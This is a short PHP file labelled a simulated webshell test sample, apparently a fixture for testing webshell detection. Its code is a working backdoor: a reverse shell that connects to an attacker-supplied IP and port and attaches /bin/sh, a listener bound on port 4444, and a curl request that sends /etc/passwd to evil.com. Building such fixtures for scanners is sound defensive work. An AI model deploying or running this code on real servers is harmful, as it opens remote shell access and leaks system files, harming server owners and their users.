<?php
/**
 * TEST FILE - SIMULATED WEBSHELL #5
 * Network/Socket based backdoor
 * 
 * DANGER: This is for testing purposes only!
 */

// Reverse shell connection
$sock = fsockopen($_GET['ip'], $_GET['port']);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

// Socket accept for incoming connections
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($socket, '0.0.0.0', 4444);
socket_listen($socket);
$client = socket_accept($socket);

// Curl for data exfiltration
$ch = curl_init('http://evil.com/collect.php');
curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('/etc/passwd'));
curl_exec($ch);
?>
